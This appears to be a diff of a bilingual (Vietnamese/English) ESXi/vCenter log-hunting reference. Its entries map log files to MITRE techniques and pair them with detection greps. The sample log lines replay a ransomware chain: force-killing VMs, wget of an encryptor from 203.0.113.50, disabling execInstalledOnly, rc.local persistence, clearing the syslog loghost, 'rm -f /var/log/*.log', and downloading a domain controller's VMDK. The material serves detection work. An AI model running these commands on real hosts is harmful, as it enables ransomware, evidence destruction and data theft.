+2026-10-24T02:31:07Z shell[2103311]: [root]: vim-cmd vmsvc/getallvms
+2026-10-24T02:31:41Z shell[2103311]: [root]: esxcli vm process kill --type=force --world-id=1052211
+2026-10-24T02:31:50Z shell[2103311]: [root]: wget http://203.0.113.50/e -O /tmp/encrypt
+2026-10-24T02:31:53Z shell[2103311]: [root]: chmod +x /tmp/encrypt
+2026-10-24T02:31:56Z shell[2103311]: [root]: /tmp/encrypt /vmfs/volumes/
+2026-10-24T02:32:02Z shell[2103311]: [root]: esxcli system settings kernel set -s execInstalledOnly -v FALSE
+2026-10-24T02:34:12Z shell[2103311]: [root]: nohup /tmp/encrypt /vmfs/volumes/ > /dev/null 2>&1 &
+2026-10-24T02:36:40Z shell[2103311]: [root]: cp /tmp/encrypt /store/.svc/agent
+2026-10-24T02:36:48Z shell[2103311]: [root]: echo '/store/.svc/agent &' >> /etc/rc.local.d/local.sh
+2026-10-24T02:37:02Z shell[2103311]: [root]: /sbin/auto-backup.sh
+2026-10-24T02:38:10Z shell[2103311]: [root]: esxcli system syslog config set --loghost=''
+2026-10-24T02:38:15Z shell[2103311]: [root]: rm -f /var/log/*.log`,"Host ESXi gần như không bao giờ cần wget/curl/chmod +x hay kill VM hàng loạt trong vận hành bình thường. Lệnh tắt execInstalledOnly, sửa local.sh/crontab, xóa loghost đều nên cảnh báo mức cao; syslog từ host ngừng đột ngột trên SIEM cũng là tín hiệu (xem vmsyslogd-dropped.log).",R`grep -E "enable_ssh|start_ssh|firewall ruleset set|getallvms|process kill|wget|curl|chmod \+x|nohup|execInstalledOnly|rc.local.d|crontab|auto-backup|loghost|rm -f /var/log" /var/log/shell.log`],
 
-["esx-file","auth.log failed","SSH vào ESXi thất bại","h","T1110",
- "sshd trên host ESXi từ chối một lần đăng nhập SSH do sai mật khẩu hoặc tài khoản không hợp lệ.","timestamp: Thời điểm ghi log (UTC)\nsshd[pid]: Tiến trình SSH daemon và PID xử lý phiên\nerror: PAM: Authentication failure: Thông báo PAM xác thực thất bại\nfor <user>: Tài khoản bị từ chối đăng nhập (vd. root)\nfrom <IP>: Địa chỉ IP nguồn thực hiện thử đăng nhập", R`2026-10-24T02:30:41Z sshd[2101010]: error: PAM: Authentication failure for root from 10.30.1.99`, "", ""],
+["esx-file","hostd.log","Host agent: đăng nhập, tác vụ, tải file datastore","h","T1078, T1110, T1005, T1048","/var/log/hostd.log là log của host agent (hostd), xử lý mọi thao tác quản lý qua Host Client, API/PowerCLI và vCenter (qua vpxa dưới tài khoản vpxuser). Ghi sự kiện đăng nhập (Event 2211 thành công, 2208 thất bại), tác vụ trên VM/host kèm opID và người dùng vCenter thực sự, và dòng 'File download from path' khi có client tải file trực tiếp từ datastore qua NFC (có thể dùng để exfiltrate nguyên VMDK mà không cần quyền trong guest).","timestamp: Thời điểm ghi log (UTC, có mili-giây)\ninfo: Mức độ log của hostd\nhostd[pid]: Tiến trình host agent và PID\nsub=: Thành phần phát sinh log (Vimsvc.ha-eventmgr = event manager, Vimsvc.TaskManager = tác vụ, Proxysvc = proxy/NFC)\nEvent 2211 / 2208: Mã sự kiện VIM, đăng nhập thành công / thất bại\nUser <user>@<IP> logged in as <client>: Tài khoản, IP nguồn và client/user-agent (Host Client, API, PowerCLI...)\nopID=: Operation ID, phần đầu trùng opID trong vpxd.log trên vCenter\nuser=vpxuser:<domain\\user>: Tác vụ từ vCenter, phần sau là người dùng vCenter thực hiện\nTask Created : haTask-...-<method>: Tác vụ được tạo trên host và API tương ứng\nFile download from path '[<datastore>] <path>' was initiated from <IP> using <tool>: File datastore bị tải, IP nguồn và công cụ",R`2026-10-24T02:15:01.512Z info hostd[2099681] [Originator@6876 sub=Vimsvc.TaskManager opID=lro-881232-1a-01 user=vpxuser:CORP\adm_x] Task Created : haTask-1-vim.VirtualMachine.powerOff-12345
+2026-10-24T02:29:40.001Z info hostd[2099681] [Originator@6876 sub=Vimsvc.ha-eventmgr] Event 2208 : Cannot login root@10.30.1.99
+2026-10-24T02:29:58.112Z info hostd[2099681] [Originator@6876 sub=Vimsvc.ha-eventmgr] Event 2211 : User root@10.30.1.99 logged in as Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+2026-10-24T02:35:10.221Z info hostd[2099681] [Originator@6876 sub=Proxysvc] File download from path '[DS-PROD-01] DC01/DC01.vmdk' was initiated from 10.30.1.99 using VMware vCenter Client/8.0.2`,"Đăng nhập trực tiếp host (bỏ qua vCenter) khi host lẽ ra ở lockdown mode; tải file .vmdk/.vmem từ IP không phải máy backup; tác vụ vpxuser không có opID khớp trong vpxd.log có thể là ai đó dùng trực tiếp credential vpxuser.",R`grep -E "Event 22(08|11)|File download from path" /var/log/hostd.log | tail -50
+grep "Task Created" /var/log/hostd.log | grep "user=vpxuser"`],
 
+["esx-file","vmkernel.log","Log VMkernel","i","","/var/log/vmkernel.log ghi hoạt động của VMkernel: lưu trữ, mạng, phần cứng, nạp module và thực thi tiến trình user-world.","timestamp: Thời điểm ghi log (UTC, có mili-giây)\ncpuN:worldID: Lõi CPU xử lý và world ID (tiến trình/luồng kernel) phát sinh log\nWARNING: Mức độ nghiêm trọng của thông điệp VMkernel (WARNING/ALERT/INFO...)\nNMP: Tên module/subsystem VMkernel liên quan (vd. Native Multipathing cho đường dẫn lưu trữ)\nnmp_DeviceRequestFastDeviceProbe:237: Hàm và dòng mã nguồn kernel phát sinh log, dùng tra cứu KB\nmessage: Nội dung chi tiết (vd. thiết bị lưu trữ 'naa....' đổi trạng thái path)",R`2026-10-24T03:00:12.441Z cpu12:2097321)WARNING: NMP: nmp_DeviceRequestFastDeviceProbe:237: NMP device "naa.600..." state in doubt; requested fast path state update...`,"",""],
 
-["esx-file","shell.log enum/kill","Liệt kê và tắt VM bằng lệnh","c","T1529, T1486",
- "/var/log/shell.log ghi từng lệnh ESXi Shell. Chuỗi này rất đặc trưng cho ransomware ESXi.","timestamp: Thời điểm thực thi lệnh (UTC), mỗi dòng shell.log là một lệnh\nshell[pid]: Tiến trình ESXi Shell (busybox) và PID của phiên\n[user]: Tài khoản đang gõ lệnh trong ESXi Shell (vd. root)\ncommand: Toàn bộ dòng lệnh được thực thi (vim-cmd vmsvc/getallvms, esxcli vm process list, esxcli vm process kill)\n--world-id=<id>: ID world (tiến trình chạy) của VM mục tiêu bị buộc tắt\n--type=force: Chế độ kill cưỡng bức, không chờ VM tắt bình thường", R`2026-10-24T02:31:07Z shell[2103311]: [root]: vim-cmd vmsvc/getallvms
-2026-10-24T02:31:20Z shell[2103311]: [root]: esxcli vm process list
-2026-10-24T02:31:41Z shell[2103311]: [root]: esxcli vm process kill --type=force --world-id=1052211`, "Theo sau thường là tải binary vào /tmp, chmod +x và chạy với tham số trỏ /vmfs/volumes.", ""],
+["esx-file","vmkwarning.log","Cảnh báo VMkernel (chặn chạy binary ngoài VIB)","h","T1059.004","/var/log/vmkwarning.log tách riêng các dòng WARNING/ALERT từ vmkernel.log. Khi execInstalledOnly đang bật, VMkernel từ chối chạy file không thuộc VIB đã cài và ghi cảnh báo, cho thấy có người thử chạy binary tự mang vào. Nội dung thông báo cụ thể khác nhau theo bản build, nên tìm theo từ khóa execInstalledOnly / Elf.","timestamp: Thời điểm ghi log (UTC, có mili-giây)\ncpuN:worldID: Lõi CPU và world ID của tiến trình liên quan\nWARNING/ALERT: Mức độ cảnh báo VMkernel\nElf: Module VMkernel nạp file thực thi ELF\n/tmp/<file>: Đường dẫn binary bị từ chối thực thi","2026-10-24T02:31:56.302Z cpu5:2103420)WARNING: Elf: 3172: execInstalledOnly is enabled: /tmp/encrypt is not from an installed VIB, refusing to execute","Một lần bị chặn rồi ngay sau đó có lệnh tắt execInstalledOnly trong shell.log là chuỗi rất đáng ngờ.",R`grep -iE "execInstalledOnly|Elf:" /var/log/vmkwarning.log /var/log/vmkernel.log`],
 
+["esx-file","vmksummary.log","Boot, shutdown và heartbeat của host","m","T1529","/var/log/vmksummary.log ghi sự kiện khởi động/tắt host và một dòng heartbeat mỗi giờ (uptime, số VM đang chạy, tài nguyên các dịch vụ). Dùng để xác định thời điểm reboot bất thường hoặc số VM đang chạy giảm đột ngột.","timestamp: Thời điểm ghi log (UTC)\nbootstop: Host has booted / Host is rebooting: Sự kiện khởi động hoặc reboot host\nheartbeat: up <uptime>: Thời gian host đã chạy kể từ lần boot gần nhất\n<N> VMs: Số VM đang chạy tại thời điểm heartbeat\n[[pid name memory]]: Bộ nhớ tiêu thụ của các tiến trình dịch vụ chính",R`2026-10-24T02:00:00Z heartbeat: up 12d4h, 18 VMs; [[2099681 hostd 512000kB] [2099900 vpxa 98000kB]] []
+2026-10-24T03:00:00Z heartbeat: up 12d5h, 0 VMs; [[2099681 hostd 498000kB] [2099900 vpxa 97000kB]] []
+2026-10-24T03:05:10Z bootstop: Host is rebooting
+2026-10-24T03:10:31Z bootstop: Host has booted`,"Số VM tụt về 0 giữa hai heartbeat ngoài giờ bảo trì khớp với giai đoạn kill VM trước khi mã hóa; reboot ngay sau khi cài VIB có thể là để nạp backdoor.",R`grep -E "bootstop|heartbeat" /var/log/vmksummary.log | tail -50`],
 
-["esx-file","execInstalledOnly","Tắt chặn thực thi binary ngoài VIB","c","T1562.001",
- "Cho phép chạy binary tự mang vào (encryptor).","timestamp: Thời điểm thực thi lệnh (UTC)\nshell[pid]: Tiến trình ESXi Shell và PID của phiên\n[user]: Tài khoản thực thi lệnh (vd. root)\nesxcli system settings kernel set: Lệnh thay đổi tham số kernel ESXi\n-s execInstalledOnly: Tên tham số kernel kiểm soát chỉ cho phép chạy binary từ VIB đã ký/cài hợp lệ\n-v FALSE: Giá trị mới, tắt kiểm soát để cho phép chạy binary tuỳ ý (vd. mã mã hoá ransomware)", R`2026-10-24T02:32:02Z shell[2103311]: [root]: esxcli system settings kernel set -s execInstalledOnly -v FALSE`, "", ""],
+["esx-file","esxupdate.log","Cài VIB / cập nhật","m","T1505","/var/log/esxupdate.log ghi các thao tác cài đặt/cập nhật VIB và image profile trên host.","timestamp: Thời điểm ghi log (UTC)\nesxupdate: Tên tiến trình ghi log quản lý cài đặt/cập nhật VIB, image profile\npid: PID của tiến trình esxupdate (vd. 2103400)\nuser: Tài khoản thực hiện thao tác cài đặt/cập nhật (vd. root)\nINFO: Mức độ log\nCommand = <lệnh>: Lệnh esxcli/esxupdate được thực thi (vd. profile.install với --no-sig-check bỏ qua kiểm tra chữ ký)","2026-10-24T02:40:00Z esxupdate: 2103400: root: INFO: Command = profile.install ... --no-sig-check","VIB cài với --no-sig-check hoặc acceptance level CommunitySupported trên host production.","esxcli software vib list | grep -v VMware"],
 
+["esx-file","rhttpproxy.log","Kết nối HTTPS tới host (rhttpproxy)","i","","/var/log/rhttpproxy.log là log của reverse proxy HTTP trên ESXi, ghi mỗi kết nối client mới tới các dịch vụ web của host (Host Client, SDK/API, vCenter). Trên ESXi 8.x phần lớn log truy cập chuyển sang envoy-access.log.","timestamp: Thời điểm ghi log (UTC, có mili-giây)\ninfo: Mức độ log\nrhttpproxy[pid]: Tiến trình reverse proxy và PID\nsub=Proxy Req <n>: Số thứ tự request được proxy\n<TCP 'host IP : 443'>: Địa chỉ và cổng của host ESXi\n<TCP 'client IP : port'>: IP nguồn và cổng của client kết nối tới","2026-10-24T02:29:57.900Z info rhttpproxy[2099500] [Originator@6876 sub=Proxy Req 00012] New proxy client <SSL(<io_obj p:0x000000d6a1b2c3d4, h:25, <TCP '10.30.10.21 : 443'>, <TCP '10.30.1.99 : 50410'>>)>","Liệt kê IP nguồn kết nối trực tiếp tới host; IP ngoài dải quản trị/vCenter cần đối chiếu với đăng nhập trong hostd.log.",R`grep "New proxy client" /var/log/rhttpproxy.log | grep -oE "TCP '[0-9.]+ : [0-9]+'>>" | sort | uniq -c`],
 
-["esx-file","log tampering","Xóa log / tắt forward syslog","c","T1070, T1562",
- "Lệnh trong ESXi Shell xóa cấu hình syslog từ xa hoặc xóa file log cục bộ để che dấu vết.","timestamp: Thời điểm thực thi lệnh (UTC)\nshell[pid]: Tiến trình ESXi Shell và PID của phiên\n[user]: Tài khoản thực thi lệnh (vd. root)\nesxcli system syslog config set --loghost='': Xóa cấu hình remote syslog host, ngắt việc forward log ra ngoài\nrm -f /var/log/*.log: Lệnh xóa toàn bộ file log cục bộ trên ESXi", R`2026-10-24T02:33:10Z shell[2103311]: [root]: esxcli system syslog config set --loghost=''
-2026-10-24T02:33:15Z shell[2103311]: [root]: rm -f /var/log/*.log`, "Syslog từ host ngừng đột ngột trên SIEM là tín hiệu cần cảnh báo (heartbeat/log-gap).", ""],
+["esx-file","envoy-access.log","Request HTTP/API tới host (Envoy, ESXi 8.x)","h","T1005","Từ ESXi 8.0, Envoy là reverse proxy phía trước các dịch vụ web của host và ghi từng request HTTP/API vào /var/log/envoy-access.log. Request GET tới /folder/... là tải file trực tiếp từ datastore (Datastore Browser, PowerCLI Copy-DatastoreItem, curl), có thể dùng để exfiltrate VMDK mà không cần vào guest OS.","timestamp: Thời điểm request (UTC)\nenvoy-access[pid]: Tiến trình Envoy và PID\n<method> <path>: Phương thức và đường dẫn request (vd. POST /sdk = API, GET /folder/... = tải file datastore)\ndsName=: Tên datastore\n<status>: HTTP status trả về\nbytes sent: Số byte trả về client, VMDK thường hàng chục GB\n<client IP:port>: IP nguồn của client\n/var/run/vmware/proxy-hostd: Dịch vụ backend xử lý request","2026-10-24T02:36:02.517Z In(166) envoy-access[2099510]: GET /folder/DC01/DC01-flat.vmdk?dcPath=ha-datacenter&dsName=DS-PROD-01 HTTP/1.1 200 via_upstream - 0 42949672960 18234 18230 0 10.30.1.99:51022 HTTP/1.1 TLSv1.2 10.30.10.21:443 127.0.0.1:43120 HTTP/1.1 - /var/run/vmware/proxy-hostd -","Tải file -flat.vmdk, .vmsn hoặc .vmem (bộ nhớ VM, chứa credential) từ IP không phải máy backup là dấu hiệu exfiltrate; đối chiếu với dòng 'File download' trong hostd.log.",R`grep -E "GET /folder/.*\.(vmdk|vmem|vmsn|vswp)" /var/log/envoy-access.log`],
 
-
-["esx-file","hostd.log login","Đăng nhập Host Client / API vào ESXi","m","T1078",
- "/var/log/hostd.log.","timestamp: Thời điểm ghi log (UTC, có mili-giây)\ninfo: Mức độ log của hostd\nhostd[pid]: Tiến trình host agent (hostd) và PID\nOriginator@6876 sub=Vimsvc.ha-eventmgr: Thành phần/subsystem phát sinh sự kiện (event manager của hostd)\nEvent <id>: Mã sự kiện VIM (2211 = đăng nhập thành công)\nUser <user>@<IP> logged in as <client>: Tài khoản, IP nguồn và client/user-agent dùng để đăng nhập (Host Client, API, PowerCLI...)", R`2026-10-24T02:29:58.112Z info hostd[2099681] [Originator@6876 sub=Vimsvc.ha-eventmgr] Event 2211 : User root@10.30.1.99 logged in as Mozilla/5.0 (Windows NT 10.0; Win64; x64)`, "Đăng nhập trực tiếp host (bỏ qua vCenter) khi host lẽ ra ở lockdown mode.", ""],
-
-
-["esx-file","hostd.log failed","Đăng nhập ESXi thất bại (hostd)","h","T1110",
- "hostd ghi nhận một lần đăng nhập thất bại trực tiếp vào host qua vSphere Client hoặc API.","timestamp: Thời điểm ghi log (UTC, có mili-giây)\ninfo: Mức độ log của hostd\nhostd[pid]: Tiến trình host agent (hostd) và PID\nOriginator@6876 sub=Vimsvc.ha-eventmgr: Thành phần phát sinh sự kiện (event manager của hostd)\nEvent <id>: Mã sự kiện VIM (2208 = đăng nhập thất bại)\nCannot login <user>@<IP>: Tài khoản và IP nguồn bị từ chối đăng nhập", R`2026-10-24T02:29:40.001Z info hostd[2099681] [Originator@6876 sub=Vimsvc.ha-eventmgr] Event 2208 : Cannot login root@10.30.1.99`, "", ""],
-
-
-["esx-file","vmkernel.log","Log VMkernel","i","",
- "Lưu trữ, mạng, phần cứng.","timestamp: Thời điểm ghi log (UTC, có mili-giây)\ncpuN:worldID: Lõi CPU xử lý và world ID (tiến trình/luồng kernel) phát sinh log\nWARNING: Mức độ nghiêm trọng của thông điệp VMkernel (WARNING/ALERT/INFO...)\nNMP: Tên module/subsystem VMkernel liên quan (vd. Native Multipathing cho đường dẫn lưu trữ)\nnmp_DeviceRequestFastDeviceProbe:237: Hàm và dòng mã nguồn kernel phát sinh log, dùng tra cứu KB\nmessage: Nội dung chi tiết (vd. thiết bị lưu trữ 'naa....' đổi trạng thái path)", R`2026-10-24T03:00:12.441Z cpu12:2097321)WARNING: NMP: nmp_DeviceRequestFastDeviceProbe:237: NMP device "naa.600..." state in doubt; requested fast path state update...`, "", ""],
-
-
-["esx-file","esxupdate.log","Cài VIB / cập nhật","m","T1505",
- "/var/log/esxupdate.log.","timestamp: Thời điểm ghi log (UTC)\nesxupdate: Tên tiến trình ghi log quản lý cài đặt/cập nhật VIB, image profile\npid: PID của tiến trình esxupdate (vd. 2103400)\nuser: Tài khoản thực hiện thao tác cài đặt/cập nhật (vd. root)\nINFO: Mức độ log\nCommand = <lệnh>: Lệnh esxcli/esxupdate được thực thi (vd. profile.install với --no-sig-check bỏ qua kiểm tra chữ ký)", R`2026-10-24T02:40:00Z esxupdate: 2103400: root: INFO: Command = profile.install ... --no-sig-check`, "VIB cài với --no-sig-check hoặc acceptance level CommunitySupported trên host production.", R`esxcli software vib list | grep -v VMware`],
-
-
+["esx-file","vmsyslogd-dropped.log","Message syslog bị drop khi forward","m","T1562.006","Khi vmsyslogd không chuyển kịp message (remote syslog không tới được, buffer đầy), các message bị drop được ghi vào /var/log/vmsyslogd-dropped.log. File này giúp khôi phục phần log bị thiếu trên SIEM và phân biệt mất kết nối thật với việc cố ý ngắt forward.","timestamp: Thời điểm của message gốc (UTC)\n<process>[pid]: Tiến trình đã phát sinh message gốc (vd. shell, sshd, hostd)\nmessage: Nội dung nguyên văn của message không được forward",R`2026-10-24T02:38:10Z shell[2103311]: [root]: esxcli system syslog config set --loghost=''
+2026-10-24T02:38:15Z shell[2103311]: [root]: rm -f /var/log/*.log`,"Khi SIEM có khoảng trống log từ host, đọc file này trước tiên; kết hợp với esxcli system syslog config get để xem cấu hình loghost hiện tại.",R`tail -200 /var/log/vmsyslogd-dropped.log
+esxcli system syslog config get`],
 
 /* ===== ESXi events ===== */
 ["esx-ev","esx.audit.account.locked","Tài khoản local bị khóa","h","T1110",
@@ -1560,7 +1519,6 @@ esx.audit.shell.enabled: The ESXi command line shell has been enabled.`, "SSH b�
 
 ["esx-ev","esx.audit.ssh.session.opened","Phiên SSH mở","m","T1021.004",
  "vobd ghi nhận một phiên SSH vừa được mở vào host ESXi, kèm tài khoản và IP nguồn.","timestamp: Thời điểm ghi log VOB (UTC)\n[UserLevelCorrelator]: Thành phần vobd tương quan sự kiện\n[esx.audit.ssh.session.opened]: Tên sự kiện audit VOB — phiên SSH được mở\n'<user>@<IP>': Tài khoản và địa chỉ IP nguồn của phiên SSH vừa mở", R`2026-10-24T02:31:00.500Z: [UserLevelCorrelator] ...: [esx.audit.ssh.session.opened] SSH session was opened for 'root@10.30.1.99'.`, "", ""],
-
 
 
 /* ===== Added entries (accuracy pass + gap-fill) ===== */
@@ -1715,12 +1673,6 @@ esx.audit.shell.enabled: The ESXi command line shell has been enabled.`, "SSH b�
 
 
 ["vc-file","rhttpproxy.log","Log reverse proxy HTTPS của vCenter","m","T1595, T1190","rhttpproxy là cổng vào HTTPS duy nhất của vCenter, định tuyến request tới các dịch vụ con (sdk, ui, websso...). Log này hữu ích để phát hiện dò quét hoặc khai thác nhắm vào các endpoint quản trị trước khi có dấu vết ở log ứng dụng chi tiết hơn (vpxd.log, websso.log). Cần bật verbose logging để log IP nguồn.","IP nguồn, đường dẫn request, mã trạng thái HTTP","2026-10-24T02:10:03.112+07:00 info rhttpproxy[9876] Accepted connection from 45.33.12.9:51233; forwarding to /sdk","",""],
-
-
-["esx-file","hostd.log NFC file download","Tải trực tiếp file VMDK qua Datastore Browser (NFC)","h","T1005, T1048","hostd.log ghi dòng 'File download from path ... was initiated from ...' khi có client tải file trực tiếp từ datastore qua giao thức NFC (Datastore Browser hoặc công cụ quản trị khác), bỏ qua guest OS. Kỹ thuật này được ghi nhận để exfiltrate nguyên file VMDK (vd. của Domain Controller) mà không cần quyền trong guest.","Datastore, VMPath, InitiatorTool, InitiatorIP","2026-10-24T02:35:10.221Z info hostd[2099681] [Originator@6876 sub=Proxysvc] File download from path '[DS-PROD-01] DC01/DC01.vmdk' was initiated from 10.30.1.99 using VMware vCenter Client/8.0.2","",""],
-
-
-["esx-file","shell.log firewall ruleset change","Mở/đóng ruleset firewall ESXi qua esxcli","h","T1562.004","shell.log ghi lại lệnh esxcli network firewall ruleset set khi admin bật ruleset tường lửa cho một dịch vụ (vd. sshServer) hoặc mở allowed-all. Ransomware operator thường bật ruleset này ngay trước/cùng lúc bật SSH để duy trì truy cập từ xa.","timestamp: Thời điểm thực thi lệnh (UTC)\nshell[pid]: Tiến trình ESXi Shell và PID của phiên\n[user]: Tài khoản thực thi lệnh (vd. root)\nesxcli network firewall ruleset set: Lệnh thay đổi cấu hình ruleset firewall ESXi\n--ruleset-id=<name>: Tên ruleset firewall bị thay đổi (vd. sshServer)\n--enabled=true --allowed-all=true: Bật ruleset và cho phép mọi IP nguồn truy cập, mở toang tường lửa cho dịch vụ đó","2026-10-24T02:30:50Z shell[2103311]: [root]: esxcli network firewall ruleset set --ruleset-id=sshServer --enabled=true --allowed-all=true","",""],
 
 
 ["esx-ev","esx.audit.net.firewall.config.changed","Thay đổi cấu hình firewall ESXi","h","T1562.004","Sự kiện VOB/audit ghi nhận khi cấu hình firewall ESXi thay đổi (bật/tắt ruleset, sửa allowed IP...), xuất hiện trong vobd.log/hostd.log song song với lệnh esxcli tương ứng trong shell.log. Lưu ý: tên sự kiện được xác nhận qua các nguồn log thực tế/cộng đồng bảo mật, chưa thấy liệt kê đầy đủ trong tài liệu chính thức Broadcom (phần 'Managing ESXi Audit Records' không liệt kê chi tiết từng event ID).","timestamp: Thời điểm ghi log VOB (UTC)\n[UserLevelCorrelator]: Thành phần vobd tương quan sự kiện\n[esx.audit.net.firewall.config.changed]: Tên sự kiện audit VOB — cấu hình firewall ESXi đã thay đổi\nOperation '<enable/disable>': Thao tác được thực hiện trên ruleset (bật/tắt)\nrule set <name>: Tên ruleset firewall bị tác động (vd. sshServer)\nsucceeded: Kết quả thực hiện thay đổi cấu hình","2026-10-24T02:30:51.000Z: [UserLevelCorrelator] ...: [esx.audit.net.firewall.config.changed] Firewall configuration has changed. Operation 'enable' for rule set sshServer succeeded.","",""],
@@ -2307,23 +2259,25 @@ const EN_FIELDS = [
 
 {"n":"Shell login to the appliance","d":"VCSA's Photon OS log; the exact location depends on the version (journald, /var/log/messages, /var/log/audit/).","f":"timestamp: log timestamp (syslog format)\nhostname: VCSA appliance hostname (e.g. vcsa01)\nprocess[pid]: the sshd process and PID handling the connection\nAccepted/Failed password/publickey for: authentication result and the account used (e.g. root)\nfrom <IP> port <port>: source IP and port of the connection\nssh2: session protocol","h":"SSH into the VCSA outside normal procedure; unfamiliar commands in root's bash history."},
 
-{"n":"Successful SSH to ESXi","d":"/var/log/auth.log.","f":"timestamp: Event time (UTC, ISO 8601) at the start of the auth.log line\nsshd[pid]: SSH daemon process and PID handling the login session\nAccepted <method>: Successful authentication and method used (keyboard-interactive/pam, publickey, password...)\nfor <user>: Account used to log in (e.g. root)\nfrom <IP>: Source IP address of the SSH connection\nport <port> ssh2: Client-side source TCP port and SSH2 protocol","h":""},
+{"n": "SSH login to ESXi (success / failure)", "d": "/var/log/auth.log records ESXi Shell/SSH authentication: an Accepted line on a successful login, a PAM: Authentication failure line on a wrong password or invalid account.", "f": "timestamp: Event time (UTC, ISO 8601) at the start of the line\nsshd[pid]: SSH daemon process and PID handling the session\nAccepted <method>: Successful authentication and method used (keyboard-interactive/pam, publickey, password...)\nerror: PAM: Authentication failure: Failed authentication\nfor <user>: Account logging in (e.g. root)\nfrom <IP>: Source IP address of the SSH connection\nport <port> ssh2: Client-side source TCP port and SSH2 protocol", "h": "Several failures followed by an Accepted from the same IP indicates a successful brute force; a successful SSH login from an IP outside the management range needs immediate investigation."},
 
-{"n":"Failed SSH to ESXi","d":"sshd on the ESXi host rejected an SSH login because of a wrong password or an invalid account.","f":"timestamp: Log time (UTC)\nsshd[pid]: SSH daemon process and PID\nerror: PAM: Authentication failure: PAM authentication failure message\nfor <user>: Account that was denied login (e.g. root)\nfrom <IP>: Source IP address of the login attempt","h":""},
+{"n": "ESXi Shell commands (ransomware attack chain)", "d": "/var/log/shell.log records every command typed in the ESXi Shell (SSH or DCUI). It is the most important source for reconstructing attacker activity on a host: enabling SSH and opening the firewall, enumerating and killing VMs, downloading and running the encryptor, disabling execInstalledOnly, installing persistence, then deleting logs and cutting syslog forwarding.", "f": "timestamp: Command execution time (UTC), one command per line\nshell[pid]: ESXi Shell (busybox) process and session PID (same PID = same session)\n[user]: Account typing the command (e.g. root)\nvim-cmd hostsvc/enable_ssh, start_ssh: Enables and starts the SSH service\nesxcli network firewall ruleset set --ruleset-id=<name> --enabled=true --allowed-all=true: Enables a firewall ruleset and allows all source IPs\nvim-cmd vmsvc/getallvms, esxcli vm process list: Enumerates VMs\nesxcli vm process kill --type=force --world-id=<id>: Force-kills a VM by world ID without a graceful shutdown\nwget/curl/scp, chmod +x, nohup ... &: Pulls a binary onto the host, makes it executable and runs it in the background\nesxcli system settings kernel set -s execInstalledOnly -v FALSE: Disables the restriction to VIB-installed binaries, allowing a self-introduced encryptor to run\n/etc/rc.local.d/local.sh, /var/spool/cron/crontabs/root: Boot script and root's crontab, where persistence is installed\n/sbin/auto-backup.sh: Forces the configuration into the bootbank so changes survive a reboot\nesxcli system syslog config set --loghost='': Clears the remote syslog target, stopping log forwarding\nrm -f /var/log/*.log: Deletes local log files", "h": "An ESXi host almost never needs wget/curl/chmod +x or mass VM kills in normal operation. Disabling execInstalledOnly, editing local.sh/crontab and clearing the loghost should all alert at high priority; syslog from the host suddenly stopping in the SIEM is also a signal (see vmsyslogd-dropped.log)."},
 
-{"n":"Enumerating and killing VMs via commands","d":"/var/log/shell.log records every ESXi Shell command. This sequence is highly characteristic of ESXi ransomware.","f":"timestamp: Command execution time (UTC); each shell.log line is one command\nshell[pid]: ESXi Shell (busybox) process and session PID\n[user]: Account typing the command in the ESXi Shell (e.g. root)\ncommand: Full command line executed (vim-cmd vmsvc/getallvms, esxcli vm process list, esxcli vm process kill)\n--world-id=<id>: World ID (running process) of the target VM being killed\n--type=force: Forced kill mode, does not wait for a graceful VM shutdown","h":"Usually followed by downloading a binary into /tmp, chmod +x, and running it with arguments pointing at /vmfs/volumes."},
+{"n": "Host agent: logins, tasks, datastore file downloads", "d": "/var/log/hostd.log is the host agent (hostd) log, handling every management operation from the Host Client, API/PowerCLI and vCenter (through vpxa under the vpxuser account). It records logins (Event 2211 success, 2208 failure), VM/host tasks with the opID and the real vCenter user, and a 'File download from path' line when a client downloads a file straight from a datastore over NFC (usable to exfiltrate a whole VMDK without any access inside the guest).", "f": "timestamp: Log time (UTC, with milliseconds)\ninfo: hostd log severity level\nhostd[pid]: Host agent process and PID\nsub=: Component that logged the line (Vimsvc.ha-eventmgr = event manager, Vimsvc.TaskManager = tasks, Proxysvc = proxy/NFC)\nEvent 2211 / 2208: VIM event code, successful / failed login\nUser <user>@<IP> logged in as <client>: Account, source IP and client/user-agent (Host Client, API, PowerCLI...)\nopID=: Operation ID, its prefix matches the opID in vpxd.log on vCenter\nuser=vpxuser:<domain\\user>: Task coming from vCenter, followed by the vCenter user who performed it\nTask Created : haTask-...-<method>: Task created on the host and the corresponding API\nFile download from path '[<datastore>] <path>' was initiated from <IP> using <tool>: Datastore file downloaded, source IP and tool", "h": "Logging directly into the host (bypassing vCenter) when it should be in lockdown mode; downloading .vmdk/.vmem files from an IP that isn't the backup server; a vpxuser task with no matching opID in vpxd.log may mean someone is using the vpxuser credential directly."},
 
-{"n":"Disabling the block on executing non-VIB binaries","d":"Allows running a self-introduced binary (the encryptor).","f":"timestamp: Command execution time (UTC)\nshell[pid]: ESXi Shell process and session PID\n[user]: Account executing the command (e.g. root)\nesxcli system settings kernel set: Command that changes an ESXi kernel setting\n-s execInstalledOnly: Kernel option name controlling whether only binaries from signed/installed VIBs may execute\n-v FALSE: New value, disables the restriction so arbitrary binaries can run (e.g. a ransomware encryptor)","h":""},
+{"n": "VMkernel log", "d": "/var/log/vmkernel.log records VMkernel activity: storage, network, hardware, module loading and user-world process execution.", "f": "timestamp: Log time (UTC, with milliseconds)\ncpuN:worldID: CPU core handling the event and the world ID (kernel process/thread) that logged it\nWARNING: Severity of the VMkernel message (WARNING/ALERT/INFO...)\nNMP: VMkernel module/subsystem involved (e.g. Native Multipathing for storage paths)\nnmp_DeviceRequestFastDeviceProbe:237: Kernel source function and line number that logged the message, useful for KB lookups\nmessage: Detailed event content (e.g. storage device 'naa....' changed path state)", "h": ""},
 
-{"n":"Deleting logs / disabling syslog forwarding","d":"ESXi Shell commands that clear the remote syslog target or delete local log files to cover tracks.","f":"timestamp: Command execution time (UTC)\nshell[pid]: ESXi Shell process and session PID\n[user]: Account executing the command (e.g. root)\nesxcli system syslog config set --loghost='': Clears the remote syslog host setting, stopping log forwarding\nrm -f /var/log/*.log: Command that deletes all local log files on the ESXi host","h":"Syslog from the host suddenly stopping in the SIEM is a signal worth alerting on (heartbeat/log-gap)."},
